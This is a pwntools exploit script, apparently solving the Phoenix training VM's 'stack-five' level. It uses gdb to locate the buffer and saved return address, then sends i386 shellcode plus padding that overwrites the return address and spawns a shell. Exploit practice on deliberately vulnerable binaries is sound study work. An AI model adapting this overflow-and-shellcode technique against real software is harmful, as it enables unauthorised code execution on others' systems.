from pwn import *

binary = "/opt/phoenix/i486/stack-five"
context.clear()
context.binary = binary
context.terminal = ["bash","-c"]
context.terminal = ["tmux", "splitw", "-h"]
context.log_file = "/tmp/docgil"

print(context)

# find buf adr
# find adr of return adr
# calculate amount overflowing bytes to hit ret adr
# build shellcode
# place in buffer with nopslide
# sh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
sh = asm(shellcraft.i386.linux.sh())
print("shellcode: ")
print(sh)

def pad(s, slen):
    return s+b"A"*(slen-len(s))

buf_size = 128

io = pwnlib.gdb.debug([binary],api=True)
io_gdb = io.gdb
# io = process([binary,arg])
# pid, io_gdb = pwnlib.gdb.attach(io,api=True)
io_gdb.execute("b *start_level+3")
io_gdb.continue_and_wait()
# should be in start_level frame

frame = io_gdb.selected_frame()
frame_name = frame.name()
print("frame: " +str(frame_name))
print(frame)

base_pointer = frame.read_register("ebp")
print("base pointer: ")
print(base_pointer)

return_adr_adr = base_pointer+0x4
print("ret adr pointer: ")
print(return_adr_adr)

return_adr = io_gdb.execute("x "+hex(return_adr_adr), to_string=True)
print("ret adr before exploit: ")
print(return_adr)

# found with gdb manually, write function to enumerate local vars by analyzing assembly
buf_adr = base_pointer - 0x88
print("buf adr: ")
print(hex(buf_adr))

bytes_until_ret_adr = return_adr_adr - buf_adr
overflowing_bytes = bytes_until_ret_adr - buf_size
print("amount overflowing bytes until ret adr is hit:")
print(overflowing_bytes)

io_gdb.execute("b *gets")
io_gdb.continue_and_wait()
# in gets first instruction now

buf = io_gdb.execute("x/80x"+hex(buf_adr),to_string=True)
print("buffer before input: ")
print(buf)

payload = b""
payload += pad(sh,buf_size)
payload += int(hex(overflowing_bytes),16)*b"B"
payload += pack(int(buf_adr),32)
print("payload:")
print(payload)

io.sendline(payload)
io_gdb.execute("finish")
io_gdb.wait()
# now we are right after gets

buf = io_gdb.execute("x/80x"+hex(buf_adr),to_string=True)
print("buffer after input: " + buf)

return_adr = io_gdb.execute("x "+hex(return_adr_adr), to_string=True)
print("ret adr after exploit: ")
print(return_adr)

io_gdb.continue_nowait()
io.interactive()

# io_gdb.quit()